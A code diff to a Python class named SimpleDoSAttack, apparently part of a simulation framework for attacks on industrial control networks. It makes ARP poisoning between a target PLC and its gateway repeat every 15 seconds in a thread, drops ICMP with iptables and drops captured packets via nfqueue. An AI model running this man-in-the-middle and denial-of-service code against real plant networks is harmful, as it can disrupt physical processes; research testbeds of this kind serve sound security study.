@@ -33,8 +33,8 @@ class SimpleDoSAttack(SyncedAttack):
     to the  the target PLC.
     """
 
-    ARP_POISON_REFRESH = 50
-    """Amount of times a db query will retry on a exception"""
+    ARP_POISON_PERIOD = 15
+    """Period in seconds of arp poison"""
 
     """
     :param intermediate_yaml_path: The path to the intermediate YAML file
@@ -63,10 +63,23 @@ class SimpleDoSAttack(SyncedAttack):
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-        #_thread.start_new_thread(self.launch_mitm())
-        self.launch_mitm()
         nfqueue.bind(0, self.capture)
         nfqueue.run(block=False)
+        self.logger.info(f"NFqueue Bound periodic ARP Poison between {self.target_plc_ip} and "
+                          f"{self.intermediate_attack['gateway_ip']}")
+
+
+        self.run_thread = True
+        # Are we returning from this? No, we are not
+        _thread.start_new_thread(self.launch_periodic_poison, (self.ARP_POISON_PERIOD, 0))
+        #self.launch_mitm()
+        self.logger.info(f"Configured periodic ARP Poison between {self.target_plc_ip} and "
+                          f"{self.intermediate_attack['gateway_ip']}")
+
+    def launch_periodic_poison(self, period, delay):
+        while self.run_thread:
+            self.launch_mitm()
+            time.sleep(period)
 
     def launch_mitm(self):
         # Launch the ARP poison by sending the required ARP network packets
@@ -87,6 +100,7 @@ class SimpleDoSAttack(SyncedAttack):
             packet.drop()
 
     def teardown(self):
+        self.run_thread = False
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
         if self.intermediate_yaml['network_topology_type'] == "simple":
             for plc in self.intermediate_yaml['plcs']:
@@ -116,8 +130,8 @@ class SimpleDoSAttack(SyncedAttack):
         This function will be called when we want to stop the attacker. It calls the teardown
         function if the attacker is in state 1 (running)
         """
-        if self.state == 1:
-            self.teardown()
+        self.state = 0
+        self.teardown()
 
     def attack_step(self):
         """This function just passes, as there is no required action in an attack step."""
